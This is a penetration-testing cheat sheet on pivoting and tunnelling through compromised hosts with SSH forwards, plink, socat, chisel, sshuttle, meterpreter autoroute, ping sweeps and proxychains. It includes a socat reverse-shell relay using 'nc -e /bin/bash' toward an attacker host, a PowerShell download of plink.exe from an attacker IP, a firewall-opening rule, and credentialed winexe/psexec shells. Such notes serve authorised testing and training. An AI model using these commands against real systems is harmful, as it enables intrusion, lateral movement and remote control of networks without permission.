# Port Forwarding/Tunneling and Pivoting

### SSH Tunnelling / Port Forwarding

For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10.

```
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine.

Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:

```
ssh -D 1337 user@172.16.0.5 -fN
```

#### Reverse Connections

Generate a keypair:

```
ssh-keygen
```

Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
On a new line, type the following line, then paste in the public key:

```
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty INSERT_PUBLIC_KEY
```

This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

With the key transferred, we can then connect back with a reverse port forward using the following command:

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:

```
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

This command can be used to create a reverse proxy in clients which do support it:

```
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

To close any of these connections, type ps aux | grep ssh into the terminal of the machine that created the connection.

Finally, type `sudo kill PID` to close the connection.

### Plink

Download `plink.exe`

```
C:\Users\Alfred>powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8/plink.exe', 'plink.exe')"
```

Start SSH service on our attacking box.

```
root@kali:~# service ssh start
```

Run `plink.exe`

```
C:\Users\Alfred>plink.exe -l root -pw  -R 445:127.0.0.1:445 ATK_IP

Or

C:\Users\Alfred>plink.exe -l root@ATK_IP -R 445:127.0.0.1:445

Or

cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:
`puttygen KEYFILE -o OUTPUT_KEY.ppk`
Substituting in a valid file for the keyfile, and adding in the output file.

Use `winexe` to get a shell

```
root@kali:~# winexe -U Administrator //127.0.0.1 "cmd.exe"
root@kali:~# winexe -U 'admin@password123' //127.0.0.1 cmd.exe

or

psexec.py USER:PASSWORD@IP cmd.exe
```

### Socat

#### Reverse Shell Relay

First let's start a standard netcat listener on our attacking box

```bash
sudo nc -lvnp 443
```

Next, on the compromised server, use the following command to start the relay:

```
./socat tcp-l:20000 tcp:ATTACKING_IP:443 &
./nc 127.0.0.1 20000 -e /bin/bash
```

#### Port Forwarding

- Easy
  On the compromised server

```
./socat tcp-l:LOCAL_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT &
```

- Quiet

On the attacking machine

```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

On the compromised relay server

```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

Check localhost:8000 on the attacker machine to see the port available on the intended target.

### Chisel

#### Reverse SOCKS Proxy

On the attacking machine start the server

```
./chisel server -p 8081 -reverse

./chisel server -p LISTEN_PORT --reverse &
```

On the target machine start the listening client

```
.\chisel.exe client 10.10.14.97:8081 R:8888:127.0.0.1:8888

./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

./chisel client 172.16.0.200:4242 R:socks &
```

#### Forward SOCKS Proxy

Open port in windows firewall

```
netsh advfirewall firewall add rule name="Chisel-MuirlandOracle" dir=in action=allow protocol=tcp localport=47000
```

First, on the compromised host we would use:

```
./chisel server -p LISTEN_PORT --socks5
```

On our own attacking box we would then use:

```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

### sshuttle

```bash
# 
sshuttle -r user@172.16.0.5 172.16.0.0/24
# using key-based authentication to the server (172.16.0.5)
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
# Exclude compromised server from the subnet range using the -x switch
sshuttle -r root@10.200.198.200 --ssh-cmd "ssh -i id_rsa" 10.200.198.0/24 -x 10.200.198.200
```

## Pivoting

Post exploitation on a windows machine. Find what machine the target is talking to

```
arp -a
```

On a meterpreter shell

```
run autoroute -s 10.10.10.0/24

List routes

run autoroute -p

background

use autiliary/scanner/portscan/tcp
set PORTS 80, 8080, 445, 21, 22
set RHOSTS 192.69.228.3-10
exploit

Back on the meterpreter session
portfwd add -l 1234 -p 21 -r 192.58.241.3
portfwd list

nmap -sS -sV -p 1234 localhost
use auxiliary/scanner/portscan/tcp
```

### Ping Sweeps

```
bash
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

netcat
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

### Proxychains
- /etc/proxychains4.conf
```
socks5 127.0.0.1 1080
```
Run a command you need to prefix it with ???proxychains <command>???

### Further information and Links

* [Pentesting Pivoting Guide](https://github.com/t3l3machus/pentest-pivoting)